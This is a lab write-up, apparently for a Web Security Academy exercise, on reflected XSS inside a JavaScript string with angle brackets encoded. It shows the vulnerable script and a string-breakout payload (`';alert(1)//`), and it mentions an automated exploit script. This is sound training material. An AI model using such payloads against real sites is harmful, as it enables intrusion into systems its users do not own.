# XSS LAB 09 - Reflected XSS into a JavaScript string with angle brackets HTML encoded

## Manual Solution

### 1. Access the Lab
- Open the Web Security Academy lab environment in your browser.

### 2. XSS Test
- Perform a regular search example: 'abc' and push enter.
- Right click and select view page source.
- Find the vulnerable script

### 3. Understanding the vulnerabilty
``` js
<script>
    var searchTerms = 'abc';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
- This script has a variable named searchterms
- This variable is inside the script tags, which leads to an XSS vulnerability.
- If we escape the quotes we can inject our XSS payload

### 4. Solving the lab
- Search using the following payload `';alert(1)//`
- The searchTerms variable becomes:
```js
    var searchTerms = '';alert(1)//';
```
- An alert pop-up appears.

## Automated Solution

### 1. Download the script
### 2. Run the script with the following command:
```sh
python xss_lab_09.py -u <target_url> -p (if you want to use proxy 127.0.0.1:8080)
```





